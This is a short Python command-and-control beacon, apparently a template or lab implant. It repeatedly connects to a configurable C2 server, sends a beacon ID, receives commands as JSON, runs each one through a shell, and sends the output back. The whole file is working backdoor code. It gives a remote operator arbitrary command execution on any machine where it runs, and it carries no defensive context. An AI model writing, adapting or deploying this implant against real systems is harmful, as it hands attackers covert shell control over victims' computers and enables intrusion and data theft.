#!/usr/bin/env python3

import time
import socket
import json
import struct
import subprocess

BEACON_ID = "BEACON_ID"
C2SERVER = "127.0.0.1"
TIME = 5  # * 60

first_iter = True


def sendall(s, d):
    d = d.encode("utf-8")
    s.sendall(struct.pack("!i", len(d)))
    s.sendall(d)


def recv(s):
    (l,) = struct.unpack("!i", s.recv(4))
    return s.recv(l).decode()


while True:
    if not first_iter:
        time.sleep(TIME)
    first_iter = False

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2SERVER, 54248))
        sendall(s, BEACON_ID)

        cmds = json.loads(recv(s))
        cmd_results = []

        if len(cmds) == 0:
            continue

        for cmd in cmds:
            res = subprocess.check_output(
                cmd["command"], stderr=subprocess.STDOUT, shell=True
            ).decode()
            cmd_results.append({"command_id": cmd["command_id"], "stdout": res})

        results = json.dumps(cmd_results)
        sendall(s, results)
    except Exception as e:
        print(e)
